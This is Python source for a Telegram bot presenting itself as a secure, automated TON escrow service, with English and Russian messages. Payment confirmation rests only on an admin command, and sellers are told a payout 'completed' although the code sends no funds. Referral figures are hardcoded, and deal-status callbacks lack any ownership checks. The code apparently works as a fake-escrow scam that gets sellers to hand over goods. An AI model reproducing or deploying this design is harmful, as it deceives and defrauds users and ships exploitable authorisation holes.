import os
import asyncio
import asyncpg
import secrets
import time
import ssl
from decimal import Decimal
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv

load_dotenv()

# -------- ENV --------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]
BOT_WALLET_ADDRESS = os.getenv("BOT_WALLET_ADDRESS", "YOUR_WALLET")
FEE_PERCENT = Decimal(os.getenv("FEE_PERCENT") or "3.0")
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pool = None

# -------- IMAGE (eine Datei für alle Nachrichten) --------
MAIN_IMAGE = "AgACAgUAAxkBAAIG7WjX6nozeFX2axWJ2a6SUsZzlYUqAAK2wTEblxDAVvklwsZITFijAQADAgADeAADNgQ"

# -------- TEXTE --------
TEXTS = {
    "en": {
        "welcome": (
            "👋 Welcome!\n\n"
            "💼 Reliable service for secure transactions!\n"
            "✨ Automated, fast, and hassle-free!\n\n"
            "🔷 Service fee: only 3 %\n"
            "🔷 Support 24/7: @rdmcd\n"
            "🔷 User reviews: @tonundrwrld\n\n"
            "💌❤️ Now your transactions are protected! 🛡️"
        ),
        # Menü
        "new_deal": "📄 Create a Deal",
        "my_deals": "🔎 My Deals",
        "my_wallet": "🪙 Add/Change Wallet",
        "referrals": "🧷 Referral Link",
        "support": "📞 Support",
        "settings": "⚙️ Settings",
        "menu": "📋 Main Menu:",
        "choose_lang": "🌐 Please choose your language:",
        "lang_menu": "🌐 Change Language",
        # Wallet
        "wallet_current": "👛 Current wallet:\n`{wallet}`",
        "wallet_none": (
            "🪙 No wallet set yet.\n\n"
            "Send your TON wallet address in this chat (starts with `UQ...` or `EQ...`) "
            "to save it for payouts."
        ),
        "wallet_set": "✅ Wallet saved:\n`{wallet}`",
        # Deals
        "no_deals": "ℹ️ You don’t have any deals yet.",
        "ask_amount": "💰 Enter **amount in TON** for this deal.\nExample: `10.5`",
        "ask_desc": "📝 Great! Now enter a **short description** of the item/service.",
        "deal_created": "✅ Deal successfully created!",
        "deal_not_found": "⚠️ Deal not found.",
        "deal_cancel": "❌ Deal {token} was cancelled.",
        "deal_paid": "✅ Payment for deal {token} confirmed.",
        "system_confirms": "⏳ The system will confirm automatically once payment is received.",
        # Shipment & Receipt
        "seller_sent": "✅ You confirmed shipment. Waiting for buyer confirmation…",
        "btn_seller_delivered": "📦 I have delivered the item",
        "btn_buyer_received": "✅ I have received the item",
        "buyer_prompt_after_ship": (
            "📦 Seller confirmed shipment for your deal.\n\n"
            "Please confirm here when you receive the item."
        ),
        "buyer_confirmed": "✅ Buyer confirmed receipt. Seller will now receive payout.",
        # Payout
        "deal_payout": "💸 Payout for deal {token} completed.\n\nAmount: {amount} TON\nFee: {fee} TON",
        # Referral (fixer Text + fixer Link)
        "ref_text": (
            "🔗 Your referral link:\n\n"
            "https://t.me/GiftElf_Robot?start=ref=UQBgh8roDAKf3tV3G_E8z0NAVYWEZ-Quut_AWGcIECGcfn4z\n\n"
            "👥 Referral count: 1\n"
            "💰 Referral earnings: 0.00 TON\n"
            "40% of bot fees"
        ),
        # Admin long message to seller after /paid
        "paid_seller_long": (
            "💥 Payment confirmed for deal `{token}`.\n\n"
            "👤 Buyer: {buyer}\n"
            "You will receive: {amount} TON\n"
            "You give: {desc}\n\n"
            "‼️ Hand over the goods only to the specified buyer.\n"
            "If you give them to someone else, no refund will be provided.\n"
            "For your safety, record a video of the delivery."
        ),
        # Deep link (buyer view)
        "buyer_join_view": (
            "Deal {token}\n{amount} TON\n{desc}\n\n"
            "💰 Wallet to pay:\n`{address}`\n\n"
            "Deal Number: `{token}`\n\n"
            "{system_confirms}"
        ),
    },
    "ru": {
        "welcome": (
            "👋 Добро пожаловать!\n\n"
            "💼 Надежный сервис для безопасных транзакций!\n"
            "✨ Автоматизировано, быстро и без хлопот!\n\n"
            "🔷 Комиссия сервиса: всего 3 %\n"
            "🔷 Поддержка 24/7: @rdmcd\n"
            "🔷 Отзывы пользователей: @tonundrwrld\n\n"
            "💌❤️ Теперь ваши транзакции защищены! 🛡️"
        ),
        # Меню
        "new_deal": "📄 Создать сделку",
        "my_deals": "🔎 Мои сделки",
        "my_wallet": "🪙 Добавить/Изменить кошелек",
        "referrals": "🧷 Реферальная ссылка",
        "support": "📞 Поддержка",
        "settings": "⚙️ Настройки",
        "menu": "📋 Главное меню:",
        "choose_lang": "🌐 Пожалуйста, выберите язык:",
        "lang_menu": "🌐 Сменить язык",
        # Кошелек
        "wallet_current": "👛 Текущий кошелек:\n`{wallet}`",
        "wallet_none": (
            "🪙 Кошелек еще не указан.\n\n"
            "Отправьте сюда адрес TON (начинается с `UQ...` или `EQ...`), "
            "чтобы сохранить его для выплат."
        ),
        "wallet_set": "✅ Кошелек сохранен:\n`{wallet}`",
        # Сделки
        "no_deals": "ℹ️ У вас пока нет сделок.",
        "ask_amount": "💰 Введите **сумму в TON** для этой сделки.\nПример: `10.5`",
        "ask_desc": "📝 Отлично! Теперь введите **краткое описание** товара/услуги.",
        "deal_created": "✅ Сделка успешно создана!",
        "deal_not_found": "⚠️ Сделка не найдена.",
        "deal_cancel": "❌ Сделка {token} отменена.",
        "deal_paid": "✅ Платеж по сделке {token} подтвержден.",
        "system_confirms": "⏳ Система подтвердит автоматически после получения платежа.",
        # Отправка и получение
        "seller_sent": "✅ Вы подтвердили отправку. Ждем подтверждения от покупателя…",
        "btn_seller_delivered": "📦 Я отправил товар",
        "btn_buyer_received": "✅ Я получил товар",
        "buyer_prompt_after_ship": (
            "📦 Продавец подтвердил отправку по вашей сделке.\n\n"
            "Пожалуйста, подтвердите получение, когда товар придет."
        ),
        "buyer_confirmed": "✅ Покупатель подтвердил получение. Продавец получит выплату.",
        # Выплата
        "deal_payout": "💸 Выплата по сделке {token} завершена.\n\nСумма: {amount} TON\nКомиссия: {fee} TON",
        # Реферал (фиксированный текст + ссылка)
        "ref_text": (
            "🔗 Ваша реферальная ссылка:\n\n"
            "https://t.me/GiftElf_Robot?start=ref=UQBgh8roDAKf3tV3G_E8z0NAVYWEZ-Quut_AWGcIECGcfn4z\n\n"
            "👥 Количество рефералов: 1\n"
            "💰 Заработано: 0.00 TON\n"
            "40% от комиссий бота"
        ),
        # Большой текст продавцу после /paid
        "paid_seller_long": (
            "💥 Платеж подтвержден по сделке `{token}`.\n\n"
            "👤 Покупатель: {buyer}\n"
            "Вы получите: {amount} TON\n"
            "Вы отдаете: {desc}\n\n"
            "‼️ Передавайте товар только указанному покупателю.\n"
            "Если передадите другому, возврат не осуществляется.\n"
            "Для безопасности запишите видео передачи."
        ),
        # Deep link (вид покупателя)
        "buyer_join_view": (
            "Сделка {token}\n{amount} TON\n{desc}\n\n"
            "💰 Адрес для оплаты:\n`{address}`\n\n"
            "Номер сделки: `{token}`\n\n"
            "{system_confirms}"
        ),
    }
}

# -------- DB INIT --------
async def init_db():
    global pool
    ssl_context = ssl.create_default_context(cafile=None)
    pool = await asyncpg.create_pool(DATABASE_URL, ssl=ssl_context)
    async with pool.acquire() as conn:
        await conn.execute("""
        CREATE TABLE IF NOT EXISTS deals (
            id SERIAL PRIMARY KEY,
            deal_token TEXT UNIQUE,
            seller_id BIGINT,
            seller_name TEXT,
            amount TEXT,
            description TEXT,
            status TEXT,         -- open, paid, shipped, completed, payout_done, cancelled
            buyer_id BIGINT,
            created_at BIGINT
        )
        """)
        await conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            tg_id BIGINT PRIMARY KEY,
            name TEXT,
            lang TEXT DEFAULT 'ru',
            wallet TEXT
        )
        """)

# -------- HELPERS --------
async def get_lang(uid: int) -> str:
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT lang FROM users WHERE tg_id=$1", uid)
    return row["lang"] if row else "ru"

def main_menu(lang: str = "ru") -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["my_wallet"], callback_data="my_wallet")],
        [InlineKeyboardButton(text=t["new_deal"], callback_data="create_deal")],
        [InlineKeyboardButton(text=t["referrals"], callback_data="referrals")],
        [InlineKeyboardButton(text=t["lang_menu"], callback_data="change_lang")],
        [InlineKeyboardButton(text=t["support"], url="https://forms.gle/4kN2r57SJiPrxBjf9")]
    ])

# -------- START (Deep link) --------
@dp.message(CommandStart(deep_link=True))
async def cmd_start_with_link(message: types.Message, command: CommandStart):
    uid = message.from_user.id
    # upsert user
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (tg_id,name,lang) VALUES ($1,$2,'ru') "
            "ON CONFLICT (tg_id) DO UPDATE SET name=EXCLUDED.name",
            uid, message.from_user.full_name
        )
    lang = await get_lang(uid)
    token = command.args

    if token and token.startswith("join_"):
        deal_token = token.replace("join_", "")
        async with pool.acquire() as conn:
            await conn.execute("UPDATE deals SET buyer_id=$1 WHERE deal_token=$2", uid, deal_token)
            deal = await conn.fetchrow(
                "SELECT amount,description FROM deals WHERE deal_token=$1", deal_token
            )
        if deal:
            await bot.send_photo(
                chat_id=message.chat.id,
                photo=MAIN_IMAGE,
                caption=TEXTS[lang]["buyer_join_view"].format(
                    token=deal_token,
                    amount=deal["amount"],
                    desc=deal["description"],
                    address=BOT_WALLET_ADDRESS,
                    system_confirms=TEXTS[lang]["system_confirms"]
                ),
                parse_mode="Markdown"
            )
        else:
            await message.answer(TEXTS[lang]["deal_not_found"])
    else:
        await cmd_start(message)

# -------- START --------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (tg_id,name,lang) VALUES ($1,$2,'ru') "
            "ON CONFLICT (tg_id) DO UPDATE SET name=EXCLUDED.name",
            message.from_user.id, message.from_user.full_name
        )
        row = await conn.fetchrow("SELECT lang FROM users WHERE tg_id=$1", message.from_user.id)

    lang = row["lang"] if row else "ru"

    await bot.send_photo(
        chat_id=message.chat.id,
        photo=MAIN_IMAGE,
        caption=TEXTS[lang]["welcome"],
        reply_markup=main_menu(lang),
        parse_mode="Markdown"
    )

# -------- CALLBACKS --------
user_states: dict[int, dict] = {}

@dp.callback_query()
async def cb_all(cq: types.CallbackQuery):
    data = cq.data or ""
    uid = cq.from_user.id
    lang = await get_lang(uid)

    # Sprache wählen
    if data == "change_lang":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="english", callback_data="setlang:en")],
            [InlineKeyboardButton(text="русский", callback_data="setlang:ru")]
        ])
        await cq.message.answer(TEXTS[lang]["choose_lang"], reply_markup=kb)
        await cq.answer(); return

    if data.startswith("setlang:"):
        new_lang = data.split(":")[1]
        async with pool.acquire() as conn:
            await conn.execute("UPDATE users SET lang=$1 WHERE tg_id=$2", new_lang, uid)
        await cq.message.answer(TEXTS[new_lang]["menu"], reply_markup=main_menu(new_lang))
        await cq.answer(); return

    # Deal erstellen
    if data == "create_deal":
        user_states[uid] = {"flow": "create", "step": "amount"}
        await bot.send_photo(
            chat_id=cq.message.chat.id,
            photo=MAIN_IMAGE,
            caption=TEXTS[lang]["ask_amount"],
            parse_mode="Markdown"
        )
        await cq.answer(); return

    # Meine Deals
    if data == "my_deals":
        async with pool.acquire() as conn:
            rows = await conn.fetch(
                "SELECT deal_token,amount,description,status FROM deals WHERE seller_id=$1 OR buyer_id=$1 ORDER BY id DESC",
                uid
            )
        if not rows:
            await cq.message.answer(TEXTS[lang]["no_deals"])
        else:
            for r in rows:
                await cq.message.answer(
                    f"Deal {r['deal_token']}\n{r['amount']} TON\n{r['description']}\nStatus: {r['status']}"
                )
        await cq.answer(); return

    # Wallet
    if data == "my_wallet":
        async with pool.acquire() as conn:
            row = await conn.fetchrow("SELECT wallet FROM users WHERE tg_id=$1", uid)
        if row and row["wallet"]:
            await cq.message.answer(TEXTS[lang]["wallet_current"].format(wallet=row["wallet"]), parse_mode="Markdown")
        else:
            await cq.message.answer(TEXTS[lang]["wallet_none"], parse_mode="Markdown")
        await cq.answer(); return

    # Referral
    if data == "referrals":
        await cq.message.answer(TEXTS[lang]["ref_text"], parse_mode="Markdown")
        await cq.answer(); return

    # Verk. bricht Deal ab (nur owner, nur open)
    if data.startswith("cancel_deal:"):
        deal_token = data.split(":")[1]
        async with pool.acquire() as conn:
            deal = await conn.fetchrow("SELECT seller_id,status FROM deals WHERE deal_token=$1", deal_token)
            if not deal:
                await cq.message.answer(TEXTS[lang]["deal_not_found"])
            elif deal["seller_id"] != uid:
                await cq.message.answer("⚠️ You are not the owner of this deal.")
            elif deal["status"] != "open":
                await cq.message.answer("⚠️ Deal can no longer be cancelled.")
            else:
                await conn.execute("UPDATE deals SET status='cancelled' WHERE deal_token=$1", deal_token)
                await cq.message.edit_text(TEXTS[lang]["deal_cancel"].format(token=deal_token))
        await cq.answer(); return

    # Verkäufer: "Ich habe gesendet"
    if data.startswith("seller_sent:"):
        deal_token = data.split(":")[1]
        async with pool.acquire() as conn:
            await conn.execute("UPDATE deals SET status='shipped' WHERE deal_token=$1", deal_token)
            deal = await conn.fetchrow("SELECT buyer_id FROM deals WHERE deal_token=$1", deal_token)
        if deal and deal["buyer_id"]:
            buyer_id = deal["buyer_id"]
            buyer_lang = await get_lang(buyer_id)
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=TEXTS[buyer_lang]["btn_buyer_received"], callback_data=f"buyer_received:{deal_token}")]
            ])
            await bot.send_photo(
                chat_id=buyer_id,
                photo=MAIN_IMAGE,
                caption=TEXTS[buyer_lang]["buyer_prompt_after_ship"],
                reply_markup=kb
            )
        await cq.message.answer(TEXTS[lang]["seller_sent"])
        await cq.answer(); return

    # Käufer: "Ich habe erhalten"
    if data.startswith("buyer_received:"):
        deal_token = data.split(":")[1]
        async with pool.acquire() as conn:
            await conn.execute("UPDATE deals SET status='completed' WHERE deal_token=$1", deal_token)
            deal = await conn.fetchrow("SELECT seller_id,amount FROM deals WHERE deal_token=$1", deal_token)
        if deal and deal["seller_id"]:
            seller_id = deal["seller_id"]
            seller_lang = await get_lang(seller_id)
            amt = Decimal(deal["amount"])
            fee = (amt * FEE_PERCENT / Decimal(100)).quantize(Decimal("0.0000001"))
            payout = (amt - fee).quantize(Decimal("0.0000001"))
            await bot.send_photo(
                chat_id=seller_id,
                photo=MAIN_IMAGE,
                caption=TEXTS[seller_lang]["buyer_confirmed"],
            )
            await bot.send_message(
                chat_id=seller_id,
                text=TEXTS[seller_lang]["deal_payout"].format(token=deal_token, amount=payout, fee=fee)
            )
        await cq.answer(); return

# -------- MESSAGES --------
@dp.message()
async def msg_handler(message: types.Message):
    uid = message.from_user.id
    txt = (message.text or "").strip()
    lang = await get_lang(uid)

    # Wallet speichern
    if (txt.startswith("UQ") or txt.startswith("EQ")) and len(txt) > 30:
        async with pool.acquire() as conn:
            await conn.execute("UPDATE users SET wallet=$1 WHERE tg_id=$2", txt, uid)
        await message.answer(TEXTS[lang]["wallet_set"].format(wallet=txt), parse_mode="Markdown")
        return

    # ADMIN-Befehle
    if uid in ADMIN_IDS:
        # /paid <token>
        if txt.startswith("/paid "):
            token = txt.split()[1]
            async with pool.acquire() as conn:
                deal = await conn.fetchrow(
                    "SELECT seller_id,buyer_id,amount,description FROM deals WHERE deal_token=$1",
                    token
                )
                await conn.execute("UPDATE deals SET status='paid' WHERE deal_token=$1", token)

            # Admin-Chat Bestätigung
            await bot.send_photo(
                chat_id=message.chat.id,
                photo=MAIN_IMAGE,
                caption=TEXTS[lang]["deal_paid"].format(token=token)
            )

            # Verkäufer benachrichtigen (mit großem Text + Button)
            if deal and deal["seller_id"]:
                seller_id = deal["seller_id"]
                seller_lang = await get_lang(seller_id)

                # Käuferinfo
                buyer_info = "❓ Unknown Buyer"
                if deal and deal["buyer_id"]:
                    try:
                        u = await bot.get_chat(deal["buyer_id"])
                        buyer_info = f"@{u.username}" if u.username else u.full_name
                    except Exception:
                        pass

                long_text = TEXTS[seller_lang]["paid_seller_long"].format(
                    token=token,
                    buyer=buyer_info,
                    amount=deal["amount"],
                    desc=deal["description"]
                )
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=TEXTS[seller_lang]["btn_seller_delivered"], callback_data=f"seller_sent:{token}")]
                ])
                await bot.send_photo(
                    chat_id=seller_id,
                    photo=MAIN_IMAGE,
                    caption=long_text,
                    reply_markup=kb,
                    parse_mode="Markdown"
                )

            # Käufer informieren
            if deal and deal["buyer_id"]:
                buyer_id = deal["buyer_id"]
                buyer_lang = await get_lang(buyer_id)
                try:
                    await bot.send_photo(
                        chat_id=buyer_id,
                        photo=MAIN_IMAGE,
                        caption=TEXTS[buyer_lang]["deal_paid"].format(token=token)
                    )
                except Exception:
                    pass
            return

        # /payout <token>  (nur Status-Text; echte Auszahlung on-chain außerhalb)
        if txt.startswith("/payout "):
            token = txt.split()[1]
            async with pool.acquire() as conn:
                d = await conn.fetchrow("SELECT amount FROM deals WHERE deal_token=$1", token)
                if d:
                    amt = Decimal(d["amount"])
                    fee = (amt * FEE_PERCENT / Decimal(100)).quantize(Decimal("0.0000001"))
                    payout = (amt - fee).quantize(Decimal("0.0000001"))
                    await conn.execute("UPDATE deals SET status='payout_done' WHERE deal_token=$1", token)
                    await message.answer(
                        TEXTS[lang]["deal_payout"].format(token=token, amount=payout, fee=fee)
                    )
            return

        # /cancel <token>
        if txt.startswith("/cancel "):
            token = txt.split()[1]
            async with pool.acquire() as conn:
                await conn.execute("UPDATE deals SET status='cancelled' WHERE deal_token=$1", token)
            await message.answer(TEXTS[lang]["deal_cancel"].format(token=token))
            return

    # Deal-Erstellung: Flow
    state = user_states.get(uid)
    if state and state.get("flow") == "create":
        if state["step"] == "amount":
            try:
                amt = Decimal(txt)
                if amt <= 0:
                    raise ValueError()
                state["amount"] = str(amt)
                state["step"] = "desc"
                user_states[uid] = state
                await message.answer(TEXTS[lang]["ask_desc"])
                return
            except Exception:
                await message.answer(TEXTS[lang]["ask_amount"])
                return

        elif state["step"] == "desc":
            desc = txt
            deal_token = secrets.token_hex(6)
            async with pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO deals (deal_token,seller_id,seller_name,amount,description,status,created_at)
                    VALUES ($1,$2,$3,$4,$5,'open',$6)
                """, deal_token, uid, message.from_user.full_name, state["amount"], desc, int(time.time()))
            user_states.pop(uid, None)

            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="❌ Cancel Deal", callback_data=f"cancel_deal:{deal_token}")]
            ])
            buyer_link = f"https://t.me/{(await bot.get_me()).username}?start=join_{deal_token}"

            await bot.send_photo(
                chat_id=message.chat.id,
                photo=MAIN_IMAGE,
                caption=(
                    f"{TEXTS[lang]['deal_created']}\n\n"
                    f"Token: `{deal_token}`\n\n"
                    f"Buyer Link:\n{buyer_link}"
                ),
                reply_markup=kb,
                parse_mode="Markdown"
            )
            return

    # Fallback: Menü
    await message.answer(TEXTS[lang]["menu"], reply_markup=main_menu(lang))

# -------- STARTUP --------
async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
